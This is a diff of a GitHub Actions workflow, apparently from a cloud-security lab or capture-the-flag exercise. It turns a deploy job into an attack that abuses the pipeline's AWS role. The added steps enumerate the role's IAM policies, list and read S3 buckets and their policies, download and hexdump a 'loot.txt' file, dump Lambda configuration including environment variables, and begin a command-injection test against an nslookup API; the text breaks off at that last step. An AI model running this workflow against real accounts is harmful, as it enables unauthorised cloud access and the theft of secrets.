@@ -1,20 +1,15 @@
 name: deploy
-
 on:
   push:
     branches:
       - corgi
-
 jobs:
   aws:
     runs-on: ubuntu-latest
-
     permissions:
       id-token: write
       contents: read
-
     steps:
-
       - name: Get AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
@@ -22,30 +17,56 @@ jobs:
           aws-region: us-east-1
 
       - name: AWS identity
-        run: |
-          aws sts get-caller-identity
+        run: aws sts get-caller-identity
 
-      - name: Check S3 bucket
+      - name: What can cicdRole actually do?
         run: |
-          echo "===== S3 CONTENT ====="
-          aws s3 ls s3://codec4f26c862a321ef5/
+          echo "===== ATTACHED POLICIES ====="
+          aws iam list-attached-role-policies --role-name cicdRole || true
+          echo "===== INLINE POLICIES ====="
+          aws iam list-role-policies --role-name cicdRole || true
+          for p in $(aws iam list-role-policies --role-name cicdRole --query 'PolicyNames[]' --output text 2>/dev/null); do
+            echo "--- inline policy: $p ---"
+            aws iam get-role-policy --role-name cicdRole --policy-name "$p" || true
+          done
+          for arn in $(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null); do
+            echo "--- managed policy: $arn ---"
+            ver=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text)
+            aws iam get-policy-version --policy-arn "$arn" --version-id "$ver" || true
+          done
 
-      - name: Read loot file
+      - name: Full recursive S3 listing (not just top-level)
         run: |
-          echo "===== LOOT CONTENT ====="
-          aws s3 cp s3://codec4f26c862a321ef5/loot.txt - || true
+          echo "===== RECURSIVE LISTING ====="
+          aws s3api list-objects-v2 --bucket codec4f26c862a321ef5 --output json || true
+          echo "===== BUCKET POLICY ====="
+          aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 || true
+          echo "===== BUCKET ACL ====="
+          aws s3api get-bucket-acl --bucket codec4f26c862a321ef5 || true
 
-      - name: Lambda information
+      - name: List ALL buckets you might have access to
+        run: aws s3 ls || true
+
+      - name: Read loot file (raw, in case it's not plain text)
         run: |
-          echo "===== LAMBDA CONFIG ====="
-          aws lambda get-function-configuration \
-            --function-name nslookupv2
+          aws s3 cp s3://codec4f26c862a321ef5/loot.txt ./loot.txt || true
+          echo "---- hexdump ----"
+          xxd ./loot.txt || true
+          echo "---- strings ----"
+          strings ./loot.txt || true
 
-      - name: Test API
+      - name: Full Lambda config incl. env vars
         run: |
-          echo "===== API TEST ====="
+          aws lambda get-function-configuration --function-name nslookupv2
+          echo "===== LAMBDA POLICY (resource policy) ====="
+          aws lambda get-policy --function-name nslookupv2 || true
 
-          curl -i -X POST \
-          https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-          -H "Content-Type: application/json" \
-          -d '{"domain":"example.com"}'
+      - name: Lambda role permissions
+        run: |
+          ROLE_ARN=$(aws lambda get-function-configuration --function-name nslookupv2 --query 'Role' --output text)
+          ROLE_NAME=$(echo $ROLE_ARN | awk -F'/' '{print $NF}')
+          echo "Lambda role: $ROLE_NAME"
+          aws iam list-attached-role-policies --role-name "$ROLE_NAME" || true
+          aws iam list-role-policies --role-name "$ROLE_NAME" || true
+
+      - name: Test command injection in nslookup API
